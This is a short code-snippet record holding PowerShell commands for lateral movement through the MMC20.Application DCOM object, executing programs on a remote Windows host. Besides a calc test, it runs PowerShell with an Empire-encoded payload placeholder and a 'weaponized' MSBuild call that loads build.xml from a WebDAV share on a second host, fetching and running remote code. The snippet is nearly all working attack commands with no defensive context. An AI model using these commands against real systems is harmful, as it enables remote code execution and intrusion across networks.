---
id: 36f205fa-a844-4cc8-ba1b-b0b4333a34a9
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.097596+00:00'
updated_at: '2023-04-10T20:26:06.273303+00:00'
---

# Code Snippet 36f205fa

**Language**: ps1

```ps1
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")

# Weaponized example with MSBuild
PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
```


